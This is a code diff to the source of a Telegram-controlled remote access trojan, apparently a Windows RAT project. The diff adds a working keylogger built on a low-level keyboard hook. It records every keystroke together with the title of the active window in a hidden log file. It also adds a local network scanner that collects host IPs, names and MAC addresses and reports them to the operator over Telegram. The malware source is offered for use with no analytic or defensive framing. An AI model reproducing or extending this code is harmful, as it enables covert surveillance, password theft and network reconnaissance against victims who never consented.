@@ -3,14 +3,72 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Management;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace TelegramRAT
 {
     internal class utils
     {
+        public static Thread keyloggerThread = new Thread(startKeylogger);
+        public static string loggerPath = Path.GetDirectoryName(config.InstallPath) + "\\keylogs";
+        private static string CurrentActiveWindowTitle;
+
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        // Import dll'ls
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        private static int WHKEYBOARDLL = 13;
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        public static extern short GetKeyState(int keyCode);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool GetKeyboardState(byte[] lpKeyState);
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetKeyboardLayout(uint idThread);
+
+        [DllImport("user32.dll")]
+        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+
+        [DllImport("user32.dll")]
+        static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
+        [DllImport("iphlpapi.dll", ExactSpelling = true)]
+        public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);
+
+
+
         // Is admin
         public static bool IsAdministrator()
         {
@@ -152,6 +210,82 @@ namespace TelegramRAT
 
         }
 
+        // Check target port
+        private static bool portIsOpen(string target, int port)
+        {
+            TcpClient tcpClient = new TcpClient();
+            try
+            {
+                tcpClient.Connect(target, port);
+                return true;
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
+
+        // Get default gateway
+        public static IPAddress GetDefaultGateway()
+        {
+            return NetworkInterface
+                .GetAllNetworkInterfaces()
+                .Where(n => n.OperationalStatus == OperationalStatus.Up)
+                .Where(n => n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
+                .SelectMany(n => n.GetIPProperties()?.GatewayAddresses)
+                .Select(g => g?.Address)
+                .Where(a => a != null)
+                .FirstOrDefault();
+        }
+
+        // Scan wlan
+        public static void WlanScanner(int to)
+        {
+            telegram.sendText("📡 Scanning local network. From 1 to " + to + " hosts.");
+            string gateway = "";
+            try { gateway = GetDefaultGateway().ToString(); }
+            catch (NullReferenceException)
+            {
+                telegram.sendText("🔌 Not connected to WIFI network.");
+                return;
+            }
+            byte[] macAddr = new byte[6];
+            uint macAddrLen = (uint)macAddr.Length;
+            string ip, host, mac;
+            string[] s = gateway.Split('.');
+            string target = s[0] + "." + s[1] + "." + s[2] + ".";
+            for (int i = 1; i < to; i++)
+            {
+
+                ip = target + i.ToString();
+                Ping ping = new Ping();
+                PingReply reply = ping.Send(ip, 10);
+
+                if (reply.Status == IPStatus.Success)
+                {
+                    IPAddress addr = IPAddress.Parse(ip);
+                    // Get hostname
+                    try
+                    {
+                        host = Dns.GetHostEntry(addr).HostName;
+                    }
+                    catch { host = "unknown"; }
+                    // Get mac
+                    if (SendARP(BitConverter.ToInt32(IPAddress.Parse(ip).GetAddressBytes(), 0), 0, macAddr, ref macAddrLen) != 0)
+                    { mac = "unknown"; }
+                    else
+                    {
+                        string[] v = new string[(int)macAddrLen];
+                        for (int j = 0; j < macAddrLen; j++)
+                            v[j] = macAddr[j].ToString("x2");
+                        mac = string.Join(":", v);
+                    }
+                    telegram.sendText(string.Format("✅ New host detected. Ip: \"{0}\", Name: \"{1}\", Mac: \"{2}\"", ip, host, mac));
+                }
+            }
+            telegram.sendText("✅ Scanning " + to + " hosts completed!");
+        }
+
         // Power command
         public static void PowerCommand(string args)
         {
@@ -162,6 +296,141 @@ namespace TelegramRAT
             startInfo.Arguments = args;
             process.StartInfo = startInfo;
             process.Start();
+        }
+
+        // Keylogger
+        public static void startKeylogger()
+        {
+            // Delete logs if exists
+            if(File.Exists(loggerPath))
+            { File.Delete(loggerPath);}
+            _hookID = SetHook(_proc);
+            Application.Run();
+        }
+
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            {
+                return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
+            }
+        }
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
+                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
+                string currentKey = KeyboardLayout((uint)vkCode);
+
+                if (capsLock || shiftPress)
+                {
+                    currentKey = currentKey.ToUpper();
+                }
+                else
+                {
+                    currentKey = currentKey.ToLower();
+                }
+
+                if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
+                    currentKey = "[" + (Keys)vkCode + "]";
+
+                else
+                {
+                    switch (((Keys)vkCode).ToString())
+                    {
+                        case "Space":
+                            currentKey = " ";
+                            break;
+                        case "Return":
+                            currentKey = "\n";
+                            break;
+                        case "Escape":
+                            currentKey = "[ESC]";
+                            break;
+                        case "LControlKey":
+                            currentKey = "[CTRL]";
+                            break;
+                        case "RControlKey":
+                            currentKey = "[CTRL]";
+                            break;
+                        case "RShiftKey":
+                            currentKey = "[RShift]";
+                            break;
+                        case "LShiftKey":
+                            currentKey = "[LShift]";
+                            break;
+                        case "Back":
+                            currentKey = "[Back]";
+                            break;
+                        case "LWin":
+                            currentKey = "[WIN]";
+                            break;
+                        case "Tab":
+                            currentKey = "[Tab]";
+                            break;
+                        case "Capital":
+                            if (capsLock == true)
+                                currentKey = "[CAPSLOCK: OFF]";
+                            else
+                                currentKey = "[CAPSLOCK: ON]";
+                            break;
+                    }
+                }
+
+                using (StreamWriter sw = new StreamWriter(loggerPath, true))
+                {
+                    if (CurrentActiveWindowTitle == GetActiveWindowTitle())
+                    {
+                        sw.Write(currentKey);
+                    }
+                    else
+                    {
+                        sw.WriteLine(Environment.NewLine);
+                        sw.WriteLine($"###  {GetActiveWindowTitle()} ###");
+                        sw.Write(currentKey);
+                    }
+                }
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+        //
+        private static string KeyboardLayout(uint vkCode)
+        {
+            try
+            {
+                StringBuilder sb = new StringBuilder();
+                byte[] vkBuffer = new byte[256];
+                if (!GetKeyboardState(vkBuffer)) return "";
+                uint scanCode = MapVirtualKey(vkCode, 0);
+                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
+                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
+                return sb.ToString();
+            }
+            catch { }
+            return ((Keys)vkCode).ToString();
+        }
+
+        // Get active window
+        public static string GetActiveWindowTitle()
+        {
+            try
+            {
+                IntPtr hwnd = GetForegroundWindow();
+                GetWindowThreadProcessId(hwnd, out uint pid);
+                Process p = Process.GetProcessById((int)pid);
+                string title = p.MainWindowTitle;
+                if (string.IsNullOrWhiteSpace(title))
+                    title = p.ProcessName;
+                CurrentActiveWindowTitle = title;
+                return title;
+            }
+            catch (Exception)
+            {
+                return "Unknown";
+            }
         }
 
         // Rotate displays
